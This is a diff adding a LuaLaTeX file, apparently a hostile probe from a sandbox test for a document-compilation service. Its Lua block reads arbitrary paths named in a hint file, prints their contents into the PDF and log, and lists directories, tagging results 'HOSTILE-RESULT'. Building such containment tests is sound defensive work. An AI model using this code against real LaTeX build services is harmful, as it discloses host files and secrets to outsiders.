@@ -1,0 +1,30 @@
+\documentclass{article}
+\usepackage[T1]{fontenc}
+\usepackage{luacode}
+\pdfvariable compresslevel=0
+\begin{document}
+\ttfamily
+\begin{luacode*}
+local hint = "/srv/hint/hint.txt"
+local t0 = os.time()
+while not lfs.attributes(hint) and os.time() - t0 < 25 do end
+local f = io.open(hint, "r")
+if not f then
+  texio.write_nl("HOSTILE-RESULT: no hint")
+else
+  for path in f:lines() do
+    local g, err = io.open(path, "r")
+    if g then
+      local s = g:read("a") or ""
+      texio.write_nl("HOSTILE-RESULT: read " .. path .. " " .. s)
+      tex.print(-2, s)
+    else
+      texio.write_nl("HOSTILE-RESULT: blocked " .. tostring(err))
+    end
+    local ok, it, st = pcall(lfs.dir, path)
+    if ok then for n in it, st do texio.write_nl("HOSTILE-RESULT: entry " .. n) end end
+  end
+end
+\end{luacode*}
+Known paths.
+\end{document}
